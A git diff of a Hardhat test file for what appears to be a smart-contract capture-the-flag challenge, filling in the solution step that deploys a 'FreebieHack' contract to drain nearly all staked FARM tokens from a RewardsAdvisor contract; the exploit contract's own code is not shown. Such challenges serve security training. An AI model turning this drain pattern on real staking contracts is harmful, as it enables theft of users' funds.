@@ -17,46 +17,57 @@ let farm: Contract; // farm token
 
 /// preliminary state
 before(async () => {
+	accounts = await ethers.getSigners();
+	[attacker, o1, o2, admin, adminUser] = accounts;
 
-  accounts = await ethers.getSigners();
-  [attacker, o1, o2, admin, adminUser] = accounts;
+	// deploying `FARM` token contract
+	let farmTokenFactory = await ethers.getContractFactory("Token");
+	farm = await farmTokenFactory.connect(admin).deploy("FARM", "FARM");
 
-  // deploying `FARM` token contract
-  let farmTokenFactory = await ethers.getContractFactory('Token')
-  farm = await farmTokenFactory.connect(admin).deploy('FARM','FARM')
+	await farm.connect(admin).mintPerUser(
+		// attacker gets 1
+		[await adminUser.getAddress(), await attacker.getAddress()],
+		[precision.mul(10_000), precision.mul(1)]
+	);
 
-  await farm.connect(admin).mintPerUser( // attacker gets 1
-    [await adminUser.getAddress(), await attacker.getAddress()],
-    [precision.mul(10_000), precision.mul(1)]
-  )
+	// deploying protocol contracts
+	let govTokenFactory = await ethers.getContractFactory("GovToken");
+	govToken = await govTokenFactory.connect(admin).deploy("xFARM", "xFARM");
 
-  // deploying protocol contracts
-  let govTokenFactory = await ethers.getContractFactory('GovToken')
-  govToken = await govTokenFactory.connect(admin).deploy("xFARM","xFARM")
+	let rewardsAdvisorFactory = await ethers.getContractFactory(
+		"RewardsAdvisor"
+	);
+	rewardsAdvisor = await rewardsAdvisorFactory
+		.connect(admin)
+		.deploy(farm.address, govToken.address);
 
-  let rewardsAdvisorFactory = await ethers.getContractFactory('RewardsAdvisor')
-  rewardsAdvisor = await rewardsAdvisorFactory.connect(admin).deploy(farm.address,govToken.address)
+	await govToken.connect(admin).transferOwnership(rewardsAdvisor.address);
 
-  await govToken.connect(admin).transferOwnership(rewardsAdvisor.address)
-
-  // other user stakes their `FARM` token
-  let adminUserAddress = await adminUser.getAddress()
-  await farm.connect(adminUser).approve(rewardsAdvisor.address,ethers.constants.MaxUint256)
-  await rewardsAdvisor.connect(adminUser).deposit(precision.mul(10_000),adminUserAddress,adminUserAddress)
-
+	// other user stakes their `FARM` token
+	let adminUserAddress = await adminUser.getAddress();
+	await farm
+		.connect(adminUser)
+		.approve(rewardsAdvisor.address, ethers.constants.MaxUint256);
+	await rewardsAdvisor
+		.connect(adminUser)
+		.deposit(precision.mul(10_000), adminUserAddress, adminUserAddress);
 });
 
 it("solves the challenge", async function () {
-
-  // implement solution here
-
+	const hackFactory = await ethers.getContractFactory("FreebieHack");
+	const hack = await hackFactory.connect(attacker).deploy();
+	await hack
+		.connect(attacker)
+		.run(rewardsAdvisor.address, ethers.constants.WeiPerEther.pow(2));
 });
 
 /// expected final state
 after(async () => {
-
-  // attacker drains 99.99%+ of the `FARM` tokens from RewardsAdvisor staking contract
-  expect(await farm.balanceOf(await attacker.getAddress())).to.be.gte(precision.mul(10_000))
-  expect(await farm.balanceOf(rewardsAdvisor.address)).to.be.lte(precision.mul(1))
-
+	// attacker drains 99.99%+ of the `FARM` tokens from RewardsAdvisor staking contract
+	expect(await farm.balanceOf(await attacker.getAddress())).to.be.gte(
+		precision.mul(10_000)
+	);
+	expect(await farm.balanceOf(rewardsAdvisor.address)).to.be.lte(
+		precision.mul(1)
+	);
 });
